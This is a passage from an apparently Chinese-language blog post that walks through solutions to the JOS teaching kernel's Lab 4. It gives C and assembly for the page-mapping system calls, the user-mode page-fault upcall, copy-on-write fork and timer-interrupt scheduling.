Again, most of the new code you write should be to check the</span><span class="hljs-comment">//   parameters for correctness.</span><span class="hljs-comment">//   Use the third argument to page_lookup() to</span><span class="hljs-comment">//   check the current permissions on the page.</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("sys_page_map not implemented");</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">se</span>, *<span class="hljs-title">de</span>;</span>           <span class="hljs-comment">//开始找对应的env结构</span><span class="hljs-keyword">int</span> ret = envid2env(srcenvid, &amp;se, <span class="hljs-number">1</span>);<span class="hljs-keyword">if</span> (ret) <span class="hljs-keyword">return</span> ret;ret = envid2env(dstenvid, &amp;de, <span class="hljs-number">1</span>);<span class="hljs-keyword">if</span> (ret) <span class="hljs-keyword">return</span> ret;<span class="hljs-comment">//之后是相关的条件的判断</span><span class="hljs-keyword">if</span> (srcva &gt;= (<span class="hljs-keyword">void</span>*)UTOP || dstva &gt;= (<span class="hljs-keyword">void</span>*)UTOP || ROUNDDOWN(srcva,PGSIZE) != srcva || ROUNDDOWN(dstva,PGSIZE) != dstva) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">pte_t</span> *pte;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pg</span> = <span class="hljs-title">page_lookup</span>(<span class="hljs-title">se</span>-&gt;<span class="hljs-title">env_pgdir</span>, <span class="hljs-title">srcva</span>, &amp;<span class="hljs-title">pte</span>);</span><span class="hljs-keyword">if</span> (!pg) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">int</span> flag = PTE_U|PTE_P;<span class="hljs-keyword">if</span> ((perm &amp; flag) != flag) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-keyword">if</span> (((*pte&amp;PTE_W) == <span class="hljs-number">0</span>) &amp;&amp; (perm&amp;PTE_W)) <span class="hljs-keyword">return</span> -E_INVAL;ret = page_insert(de-&gt;env_pgdir, pg, dstva, perm);<span class="hljs-keyword">return</span> ret;&#125;</code></pre></li><li><p><strong>sys_page_ummap（）</strong></p><p>  就是映射关系的清除，可以通过page_remove（）来实现</p>  <pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_page_unmap(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">void</span> *va)&#123;<span class="hljs-comment">// Hint: This function is a wrapper around page_remove().</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("sys_page_unmap not implemented");</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">env</span>;</span><span class="hljs-keyword">int</span> ret = envid2env(envid, &amp;env, <span class="hljs-number">1</span>);<span class="hljs-keyword">if</span> (ret) <span class="hljs-keyword">return</span> ret;<span class="hljs-keyword">if</span> ((va &gt;= (<span class="hljs-keyword">void</span>*)UTOP) || (ROUNDDOWN(va, PGSIZE) != va)) <span class="hljs-keyword">return</span> -E_INVAL;page_remove(env-&gt;env_pgdir, va);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></li><li><p><strong>sys_env_set_status（）</strong></p>  <pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_env_set_status(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">int</span> status)&#123;<span class="hljs-comment">// Hint: Use the 'envid2env' function from kern/env.c to translate an</span><span class="hljs-comment">// envid to a struct Env.</span><span class="hljs-comment">// You should set envid2env's third argument to 1, which will</span><span class="hljs-comment">// check whether the current environment has permission to set</span><span class="hljs-comment">// envid's status.</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("sys_env_set_status not implemented");</span><span class="hljs-keyword">if</span> (status != ENV_NOT_RUNNABLE &amp;&amp; status != ENV_RUNNABLE) <span class="hljs-keyword">return</span> -E_INVAL;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">e</span>;</span><span class="hljs-keyword">int</span> ret = envid2env(envid, &amp;e, <span class="hljs-number">1</span>);<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> ret;e-&gt;env_status = status;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></li><li><p><strong>在<code>kern/syscall.c</code>里面添加新的系统调用</strong></p>  <pre><code class="hljs c++"><span class="hljs-keyword">case</span> SYS_exofork:ret = sys_exofork();<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> SYS_env_set_status:ret = sys_env_set_status((<span class="hljs-keyword">envid_t</span>)a1, (<span class="hljs-keyword">int</span>)a2);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> SYS_page_alloc:ret = sys_page_alloc((<span class="hljs-keyword">envid_t</span>)a1, (<span class="hljs-keyword">void</span> *)a2, (<span class="hljs-keyword">int</span>)a3);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> SYS_page_map:ret = sys_page_map((<span class="hljs-keyword">envid_t</span>)a1, (<span class="hljs-keyword">void</span> *)a2,(<span class="hljs-keyword">envid_t</span>)a3, (<span class="hljs-keyword">void</span> *)a4, (<span class="hljs-keyword">int</span>)a5);<span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> SYS_page_unmap:ret = sys_page_unmap((<span class="hljs-keyword">envid_t</span>)a1, (<span class="hljs-keyword">void</span> *)a2);<span class="hljs-keyword">break</span>;</code></pre></li></ul><h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h2><h3 id="Exercise-8"><a href="#Exercise-8" class="headerlink" title="Exercise 8"></a>Exercise 8</h3><blockquote><p>Exercise 8. Implement the sys_env_set_pgfault_upcall system call. Be sure to enable permission checking when looking up the environment ID of the target environment, since this is a “dangerous” system call.</p></blockquote><p><strong>sys_env_set_pgfault_upcall（）</strong></p><p>这个系统调用为一个进程设置其用户态的页错误处理函数，当对参数进行检查之后，设置<code>env-&gt;env_pgfault_upcall</code>项即可。</p><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>sys_env_set_pgfault_upcall(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">void</span> *func)&#123;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("sys_env_set_pgfault_upcall not implemented");</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Env</span> *<span class="hljs-title">env</span>;</span><span class="hljs-keyword">int</span> ret;<span class="hljs-keyword">if</span> ((ret = envid2env(envid, &amp;env, <span class="hljs-number">1</span>)) &lt; <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">return</span> ret;&#125;env-&gt;env_pgfault_upcall = func;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h3 id="Exercise-9"><a href="#Exercise-9" class="headerlink" title="Exercise 9"></a>Exercise 9</h3><blockquote><p>Exercise 9. Implement the code in page_fault_handler in kern/trap.c required to dispatch page faults to the user-mode handler. Be sure to take appropriate precautions when writing into the exception stack. (What happens if the user environment runs out of space on the exception stack?)</p></blockquote><p>在这里，我们所需要做的是完善页错误处理函数，我们需要使用户进程遇到也错误<code>trap</code>进入kernel时，kernel能够让用户来运行处理函数</p><p>用户程序会用到自己的<code>Exception Stack</code>保存出现中断时的错误信息供处理程序使用，而这个函数就需要将中断时进程的寄存器信息等压入栈中，并运行用户的中断程序。JOS提供了一个结构<code>UTrapframe</code>保存所有要用到的终端信息，只需要在栈中的指定位置分配一块内存给<code>UTrapframe</code>，并将<code>Trapframe</code>的信息存入即可。需要注意用户进程已经在中断栈中运行和第一次触发中断两种情况，对应的<code>esp</code>位置和<code>UTrapframe</code>存放位置也会不同。</p><pre><code class="hljs c++"><span class="hljs-keyword">void</span>page_fault_handler(struct Trapframe *tf)&#123;<span class="hljs-keyword">uint32_t</span> fault_va;<span class="hljs-comment">// Read processor's CR2 register to find the faulting address</span>fault_va = rcr2();<span class="hljs-comment">// Handle kernel-mode page faults.</span><span class="hljs-comment">// LAB 3: Your code here.</span><span class="hljs-keyword">if</span> ((tf-&gt;tf_cs &amp; <span class="hljs-number">3</span>) == <span class="hljs-number">0</span>)panic(<span class="hljs-string">"page_fault_handler():page fault in kernel mode!\n"</span>);<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">if</span> (curenv-&gt;env_pgfault_upcall) &#123;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">UTrapframe</span> *<span class="hljs-title">utf</span>;</span><span class="hljs-keyword">uintptr_t</span> New_esp;<span class="hljs-comment">//判断是否已经在Exception Stack中</span><span class="hljs-keyword">if</span> (tf-&gt;tf_esp &gt; UXSTACKTOP - PGSIZE - <span class="hljs-number">1</span> &amp;&amp; tf-&gt;tf_esp &lt; UXSTACKTOP) &#123;New_esp = tf-&gt;tf_esp - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">uint32_t</span>) - <span class="hljs-keyword">sizeof</span>(struct UTrapframe);utf = (struct UTrapframe*)New_esp;&#125;<span class="hljs-keyword">else</span> &#123;New_esp = UXSTACKTOP - <span class="hljs-keyword">sizeof</span>(struct UTrapframe);utf = (struct UTrapframe*)New_esp;&#125;<span class="hljs-comment">//为UTrapframe赋具体值</span>user_mem_assert(curenv, (<span class="hljs-keyword">void</span> *) New_esp, <span class="hljs-keyword">sizeof</span>(struct UTrapframe), PTE_W | PTE_P | PTE_U);utf-&gt;utf_eflags = tf-&gt;tf_eflags;utf-&gt;utf_eip = tf-&gt;tf_eip;utf-&gt;utf_err = tf-&gt;tf_err;utf-&gt;utf_esp = tf-&gt;tf_esp;utf-&gt;utf_fault_va = fault_va;utf-&gt;utf_regs = tf-&gt;tf_regs;curenv-&gt;env_tf.tf_esp = New_esp;curenv-&gt;env_tf.tf_eip = (<span class="hljs-keyword">uintptr_t</span>)curenv-&gt;env_pgfault_upcall;env_run(curenv);&#125;<span class="hljs-comment">// Destroy the environment that caused the fault.</span>cprintf(<span class="hljs-string">"[%08x] user fault va %08x ip %08x\n"</span>,curenv-&gt;env_id, fault_va, tf-&gt;tf_eip);print_trapframe(tf);env_destroy(curenv);&#125;</code></pre><h3 id="Exercise-10"><a href="#Exercise-10" class="headerlink" title="Exercise 10"></a>Exercise 10</h3><blockquote><p>Exercise 10. Implement the _pgfault_upcall routine in lib/pfentry.S. The interesting part is returning to the original point in the user code that caused the page fault. You’ll return directly there, without going back through the kernel. The hard part is simultaneously switching stacks and re-loading the EIP. </p></blockquote><p>要实现的<code>_pgfault_upcall（）</code>的作用是调用已经实现的页错误处理程序，并且在运行完处理程序之后返回到原来的进程中继续运行，同时在实现的时候由于返回过程中需要维护寄存器的信息，所以不能直接通过ret，jmp指令实现，而是通过mov来实现</p><pre><code class="hljs c++">.<span class="hljs-built_in">text</span>.globl _pgfault_upcall_pgfault_upcall:<span class="hljs-comment">// Call the C page fault handler.</span>pushl %esp<span class="hljs-comment">// function argument: pointer to UTF</span>movl _pgfault_handler, %eaxcall *%eaxaddl $<span class="hljs-number">4</span>, %esp<span class="hljs-comment">// pop function argument</span>        <span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// Restore the trap-time registers.  After you do this, you</span><span class="hljs-comment">// can no longer modify any general-purpose registers.</span><span class="hljs-comment">// LAB 4: Your code here.</span>addl $<span class="hljs-number">8</span>, %esp<span class="hljs-comment">// 跳过utf_fault_va和utf_err</span>movl <span class="hljs-number">40</span>(%esp), %eax <span class="hljs-comment">// 保存中断发生时的esp到eax</span>movl <span class="hljs-number">32</span>(%esp), %ecx <span class="hljs-comment">// 保存终端发生时的eip到ecx</span>movl %ecx, <span class="hljs-number">-4</span>(%eax) <span class="hljs-comment">// 将中断发生时的esp值亚入到到原来的栈中</span>popaladdl $<span class="hljs-number">4</span>, %esp<span class="hljs-comment">// 跳过eip</span><span class="hljs-comment">// Restore eflags from the stack.  After you do this, you can</span><span class="hljs-comment">// no longer use arithmetic operations or anything else that</span><span class="hljs-comment">// modifies eflags.</span><span class="hljs-comment">// LAB 4: Your code here.</span>popfl<span class="hljs-comment">// Switch back to the adjusted trap-time stack.</span><span class="hljs-comment">// LAB 4: Your code here.</span>popl %esp<span class="hljs-comment">// Return to re-execute the instruction that faulted.</span><span class="hljs-comment">// LAB 4: Your code here.</span>lea <span class="hljs-number">-4</span>(%esp), %esp<span class="hljs-comment">// 因为之前压入了eip的值但是没有减esp的值，所以现在需要将esp寄存器中的值减4</span>ret</code></pre><h3 id="Exercise-11"><a href="#Exercise-11" class="headerlink" title="Exercise 11"></a>Exercise 11</h3><blockquote><p>Exercise 11. Finish set_pgfault_handler() in lib/pgfault.c.</p></blockquote><p><code>set_pgfault_handle()</code>为一个进程设置其页错误处理程序。如果程序没有设置处理程序，那么需要调用<code>sys_page_alloc()</code>分配一块<code>Exception Stack</code>，并使用<code>sys_env_set_pgfault_upcall()</code>将中断入口设为完成的汇编程序，最后设置<code>_pagefault_handler()</code>为C语言实现的处理函数即可</p><pre><code class="hljs c++"><span class="hljs-keyword">void</span>set_pgfault_handler(<span class="hljs-keyword">void</span> (*handler)(struct UTrapframe *utf))&#123;<span class="hljs-keyword">int</span> r;<span class="hljs-keyword">if</span> (_pgfault_handler == <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">// First time through!</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-comment">// panic("set_pgfault_handler not implemented");</span><span class="hljs-keyword">int</span> r = sys_page_alloc(<span class="hljs-number">0</span>, (<span class="hljs-keyword">void</span> *)(UXSTACKTOP-PGSIZE), PTE_W | PTE_U | PTE_P);<span class="hljs-comment">//分配异常栈</span><span class="hljs-keyword">if</span> (r &lt; <span class="hljs-number">0</span>) &#123;panic(<span class="hljs-string">"set_pgfault_handler:sys_page_alloc failed"</span>);;&#125;sys_env_set_pgfault_upcall(<span class="hljs-number">0</span>, _pgfault_upcall);<span class="hljs-comment">//系统调用，设置进程的env_pgfault_upcall属性</span>&#125;<span class="hljs-comment">// Save handler pointer for assembly to call.</span>_pgfault_handler = handler;&#125;</code></pre><h3 id="Exercise-12"><a href="#Exercise-12" class="headerlink" title="Exercise 12"></a>Exercise 12</h3><blockquote><p>Exercise 12. Implement fork, duppage and pgfault in lib/fork.c.<br>Test your code with the forktree program. It should produce the following messages, with interspersed ‘new env’, ‘free env’, and ‘exiting gracefully’ messages. The messages may not appear in this order, and the environment IDs may be different.</p></blockquote><ul><li><p><strong>pgfault（）</strong></p><p>  该函数实现的是Copy On Write式的fork（）函数遇到也错误时候的处理程序，由于COW式的fork（）创建出来的子进程一开始就和父进程共享物理内存，因此，当父进程或者子进程要修改一个物理内存页的时候，需要新的一页物理内存来避免冲突</p><p>  判断一下参数合法与否，在这里与之前稍有不同的是还需要判断当前要处理的页是否是一个COW页，以及是否由于写操作引起的页错误。判断方式与之前相同（使用JOS定义好的<code>FEC_WR</code>测试<code>err</code>，使用<code>PTE_COW</code>检查页表项标志位）。</p><p>  随后首先用<code>sys_page_alloc()</code>为进程希望修改的COW页分配新的物理内存，再取消引发页错误的虚拟地址原有的映射，并将刚才映射在缓存区的新页映射给<code>addr</code>，最后取消缓存区的映射即可。中间每一步都需要检查是否有错误产生。</p></li></ul><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>pgfault(struct UTrapframe *utf)&#123;<span class="hljs-keyword">void</span> *addr = (<span class="hljs-keyword">void</span> *) utf-&gt;utf_fault_va;<span class="hljs-keyword">uint32_t</span> err = utf-&gt;utf_err;<span class="hljs-keyword">int</span> r;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">uint32_t</span> pgnum = PGNUM(addr);<span class="hljs-keyword">uint32_t</span> pgde = PDX(addr);<span class="hljs-keyword">envid_t</span> envid = sys_getenvid();<span class="hljs-keyword">if</span> (!((err&amp;FEC_WR) &amp;&amp; (uvpt[pgnum]&amp;PTE_COW) &amp;&amp; (uvpt[pgnum]&amp;PTE_P) &amp;&amp; (uvpd[pgde]&amp;PTE_P)))panic(<span class="hljs-string">"Page cannot be fixed\n"</span>);addr = ROUNDDOWN(addr,PGSIZE);<span class="hljs-keyword">if</span> (sys_page_alloc(envid,(<span class="hljs-keyword">void</span>*)PFTEMP,PTE_W|PTE_P|PTE_U) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_alloc panic\n"</span>);memmove(PFTEMP,addr,PGSIZE);<span class="hljs-keyword">if</span> (sys_page_unmap(envid,addr) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_unmap panic\n"</span>);<span class="hljs-keyword">if</span> (sys_page_map(envid, PFTEMP, envid, addr, PTE_P|PTE_U|PTE_W) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_map panic\n"</span>);<span class="hljs-keyword">if</span> (sys_page_unmap(envid,PFTEMP) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_unmap panic\n"</span>);&#125;</code></pre><ul><li><strong>deppage（）</strong></li></ul><p>该函数的作用式将虚拟内存也好为pn的虚拟内存映射到一个给定进程的相同虚拟空间，实现上只需要调用<code>sys_page_map()</code>即可</p><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span>duppage(<span class="hljs-keyword">envid_t</span> envid, <span class="hljs-keyword">unsigned</span> pn)&#123;<span class="hljs-keyword">int</span> r;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">void</span> *addr = (<span class="hljs-keyword">void</span> *)(pn*PGSIZE);<span class="hljs-keyword">envid_t</span> thisenvid = sys_getenvid();<span class="hljs-keyword">if</span> ((uvpt[pn]&amp;PTE_W) || (uvpt[pn]&amp;PTE_COW)) &#123;<span class="hljs-keyword">if</span> (sys_page_map(thisenvid, addr, envid, addr, PTE_P|PTE_U|PTE_COW) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_map dupage"</span>);<span class="hljs-keyword">if</span> (sys_page_map(thisenvid, addr, thisenvid, addr, PTE_P|PTE_U|PTE_COW) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_map dupage"</span>);&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">if</span> (sys_page_map(thisenvid, addr, envid, addr, PTE_P|PTE_U) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_map dupage"</span>);&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><ul><li><strong>fork（）</strong></li></ul><p>一个进程调用这个<code>fork()</code>后，首先会将进程的页错误处理函数设置为刚才实现的COW专用页错误处理函数；随后调用<code>sys_exofork()</code>产生一个新的进程。但是这里产生的新进程仅仅是复制了父进程的寄存器信息，接下来需要完成子进程的内存映射。在父进程中，首先需要将<code>UTEXT</code>到Exception Stack之间的用户内存映射给子进程。这里要用到刚才实现的<code>duppage()</code>函数来进行逐页映射（需要处理COW）。随后要给这个进程分配自己的Exception Stack，并初始化其中断处理函数，最后将子进程状态设为<code>ENV_RUNNABLE</code>，返回子进程id。子进程中<code>fork()</code>返回0即可</p><pre><code class="hljs c++"><span class="hljs-keyword">envid_t</span>fork(<span class="hljs-keyword">void</span>)&#123;<span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">uint32_t</span> err;set_pgfault_handler(pgfault); <span class="hljs-comment">// 缺页处理函数</span><span class="hljs-keyword">envid_t</span> envid = sys_exofork();<span class="hljs-comment">// 产生新的进程，设置了进程的状态，复制寄存器（TrapFrame）</span><span class="hljs-keyword">if</span> (envid == -E_NO_FREE_ENV ||envid == -E_NO_MEM)&#123;panic(<span class="hljs-string">"cannot allocate an environment for %e\n"</span>, envid);&#125;<span class="hljs-keyword">if</span> (envid &gt; <span class="hljs-number">0</span>)&#123;<span class="hljs-comment">// 父进程</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">uint32_t</span> pn = PGNUM(UTEXT); pn &lt; PGNUM(UXSTACKTOP - PGSIZE); pn++)&#123;<span class="hljs-keyword">if</span> (((uvpd[PDX(pn*PGSIZE)]&amp;PTE_P) != PTE_P) || ((uvpt[pn]&amp;PTE_P) != PTE_P)) <span class="hljs-keyword">continue</span>;<span class="hljs-keyword">if</span> ((err = duppage(envid, pn)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"duppage err:%e\n"</span>, err);&#125;<span class="hljs-keyword">if</span> ((err = sys_page_alloc(envid, (<span class="hljs-keyword">void</span> *)(UXSTACKTOP - PGSIZE), PTE_P|PTE_U|PTE_W)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_page_alloc err:%e\n"</span>, err);<span class="hljs-keyword">extern</span> <span class="hljs-keyword">void</span> _pgfault_upcall();<span class="hljs-keyword">if</span> ((err =sys_env_set_pgfault_upcall(envid, _pgfault_upcall))&lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_env_set_pgfault_upcall err:%e\n"</span>, err);<span class="hljs-keyword">if</span> ((err = sys_env_set_status(envid, ENV_RUNNABLE)) &lt; <span class="hljs-number">0</span>)panic(<span class="hljs-string">"sys_env_set_status err:%e\n"</span>, err);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">//子进程</span>thisenv = &amp;envs[ENVX(sys_getenvid())];<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">return</span> envid;&#125;</code></pre><h2 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h2><h3 id="Exercise-13"><a href="#Exercise-13" class="headerlink" title="Exercise 13"></a>Exercise 13</h3><blockquote><p>Exercise 13. Modify kern/trapentry.S and kern/trap.c to initialize the appropriate entries in the IDT and provide handlers for IRQs 0 through 15. Then modify the code in env_alloc() in kern/env.c to ensure that user environments are always run with interrupts enabled.</p></blockquote><p><strong>trapentry.s</strong></p><pre><code class="hljs c++">TRAPHANDLER_NOEC(handler32, IRQ_OFFSET + IRQ_TIMER)TRAPHANDLER_NOEC(handler33, IRQ_OFFSET + IRQ_KBD)TRAPHANDLER_NOEC(handler34, <span class="hljs-number">34</span>)TRAPHANDLER_NOEC(handler35, <span class="hljs-number">35</span>)TRAPHANDLER_NOEC(handler36, IRQ_OFFSET + IRQ_SERIAL)TRAPHANDLER_NOEC(handler37, <span class="hljs-number">37</span>)TRAPHANDLER_NOEC(handler38, <span class="hljs-number">38</span>)TRAPHANDLER_NOEC(handler39, IRQ_OFFSET + IRQ_SPURIOUS)TRAPHANDLER_NOEC(handler40, <span class="hljs-number">40</span>)TRAPHANDLER_NOEC(handler41, <span class="hljs-number">41</span>)TRAPHANDLER_NOEC(handler42, <span class="hljs-number">42</span>)TRAPHANDLER_NOEC(handler43, <span class="hljs-number">43</span>)TRAPHANDLER_NOEC(handler44, <span class="hljs-number">44</span>)TRAPHANDLER_NOEC(handler45, <span class="hljs-number">45</span>)TRAPHANDLER_NOEC(handler46, IRQ_OFFSET + IRQ_IDE)TRAPHANDLER_NOEC(handler47, <span class="hljs-number">47</span>)TRAPHANDLER_NOEC(handler51, IRQ_OFFSET + IRQ_ERROR)</code></pre><p><strong>trap_init()</strong></p><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler32</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler33</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler34</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler35</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler36</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler37</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler38</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler39</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler40</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler41</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler42</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler43</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler44</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler45</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler46</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler47</span><span class="hljs-params">()</span></span>;<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handler51</span><span class="hljs-params">()</span></span>;...SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">0</span>], <span class="hljs-number">0</span>, GD_KT, handler32, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">1</span>], <span class="hljs-number">0</span>, GD_KT, handler33, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">2</span>], <span class="hljs-number">0</span>, GD_KT, handler34, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">3</span>], <span class="hljs-number">0</span>, GD_KT, handler35, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">4</span>], <span class="hljs-number">0</span>, GD_KT, handler36, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">5</span>], <span class="hljs-number">0</span>, GD_KT, handler37, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">6</span>], <span class="hljs-number">0</span>, GD_KT, handler38, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">7</span>], <span class="hljs-number">0</span>, GD_KT, handler39, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">8</span>], <span class="hljs-number">0</span>, GD_KT, handler40, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">9</span>], <span class="hljs-number">0</span>, GD_KT, handler41, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">10</span>], <span class="hljs-number">0</span>, GD_KT, handler42, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">11</span>], <span class="hljs-number">0</span>, GD_KT, handler43, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">12</span>], <span class="hljs-number">0</span>, GD_KT, handler44, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">13</span>], <span class="hljs-number">0</span>, GD_KT, handler45, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">14</span>], <span class="hljs-number">0</span>, GD_KT, handler46, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">15</span>], <span class="hljs-number">0</span>, GD_KT, handler47, <span class="hljs-number">0</span>);SETGATE(idt[IRQ_OFFSET + <span class="hljs-number">19</span>], <span class="hljs-number">0</span>, GD_KT, handler51, <span class="hljs-number">0</span>);</code></pre><p><strong>env_alloc()</strong></p><pre><code class="hljs c++"><span class="hljs-comment">// Enable interrupts while in user mode.</span><span class="hljs-comment">// LAB 4: Your code here.</span>e-&gt;env_tf.tf_eflags |= FL_IF;</code></pre><h3 id="Exercise-14"><a href="#Exercise-14" class="headerlink" title="Exercise 14"></a>Exercise 14</h3><blockquote><p>Exercise 14. Modify the kernel’s trap_dispatch() function so that it calls sched_yield() to find and run a different environment whenever a clock interrupt takes place.</p></blockquote><p><strong>trap_dispatch()</strong></p><p>修改trap_dispatch()，使得时钟中断发生时，切换到另一个进程执行，按照提示来就可以</p><pre><code class="hljs c++"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>trap_dispatch(struct Trapframe *tf)&#123;...<span class="hljs-comment">// Handle clock interrupts. Don't forget to acknowledge the</span><span class="hljs-comment">// interrupt using lapic_eoi() before calling the scheduler!</span><span class="hljs-comment">// LAB 4: Your code here.</span><span class="hljs-keyword">if</span> (tf-&gt;tf_trapno == IRQ_OFFSET + IRQ_TIMER) &#123;lapic_eoi();sched_yield();<span class="hljs-comment">// return;</span>&#125;...&#125;</code></pre><h3 id="Exercise-15"><a href="#Exercise-15" class="headerlink" title="Exercise 15"></a>Exercise 15</h3><blockquote><p>Exercise 15. Implement sys_ipc_recv and sys_ipc_try_send in kern/syscall.c. Read the comments on both before implementing them, since they have to work together. When you call envid2env in these routines, you should set the checkperm flag to 0, meaning that any environment is allowed to send IPC messages to any other environment, and the kernel does no special permission checking other than verifying that the target envid is valid.<br>Then implement the ipc_recv and ipc_send functions in 